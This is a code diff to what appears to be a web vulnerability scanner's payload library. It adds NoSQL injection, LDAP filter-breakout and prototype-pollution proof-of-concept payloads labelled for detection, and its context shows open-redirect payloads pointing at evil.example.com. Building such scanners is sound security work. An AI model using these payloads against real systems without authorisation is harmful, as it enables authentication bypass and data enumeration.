@@ -30,6 +30,9 @@ class VulnClass(str, Enum):
     XXE = "xxe"
     OPEN_REDIRECT = "open_redirect"
     LFI = "lfi"
+    NOSQLI = "nosqli"
+    LDAPI = "ldapi"
+    PROTOTYPE_POLLUTION = "prototype_pollution"
 
 
 class PayloadContext(str, Enum):
@@ -129,6 +132,38 @@ _LIB: Dict[VulnClass, Dict[PayloadContext, List[tuple]]] = {
         PayloadContext.URL: [
             ("//evil.example.com", "scheme-relative redirect PoC"),
             ("https://evil.example.com", "absolute redirect PoC"),
+        ],
+    },
+    VulnClass.NOSQLI: {
+        # operator-injection PoC: boolean auth-bypass + Mongo $-operators (detection only).
+        PayloadContext.SQL: [
+            ("' || '1'=='1", "js boolean-true (NoSQL auth bypass)"),
+            ("'; return true; var _x='", "$where js-injection true"),
+        ],
+        PayloadContext.ANY: [
+            ('{"$ne":null}', "$ne operator (always-true match)"),
+            ('{"$gt":""}', "$gt operator (always-true match)"),
+            ('{"$regex":".*"}', "$regex operator (always-true match)"),
+        ],
+    },
+    VulnClass.LDAPI: {
+        PayloadContext.ANY: [
+            ("*", "wildcard filter (enumerate)"),
+            ("*)(uid=*))(|(uid=*", "filter breakout (auth bypass PoC)"),
+            ("*)(|(objectClass=*", "objectClass enumeration PoC"),
+            ("admin)(&)", "always-true AND injection"),
+        ],
+    },
+    VulnClass.PROTOTYPE_POLLUTION: {
+        # marker `hydrapp` lets the detector confirm only when it appears under injection.
+        PayloadContext.URL: [
+            ("__proto__[hydrapp]=polluted", "__proto__ query pollution PoC"),
+            ("constructor[prototype][hydrapp]=polluted", "constructor.prototype pollution PoC"),
+        ],
+        PayloadContext.ANY: [
+            ('{"__proto__":{"hydrapp":"polluted"}}', "__proto__ JSON-body pollution PoC"),
+            ('{"constructor":{"prototype":{"hydrapp":"polluted"}}}',
+             "constructor.prototype JSON pollution PoC"),
         ],
     },
 }
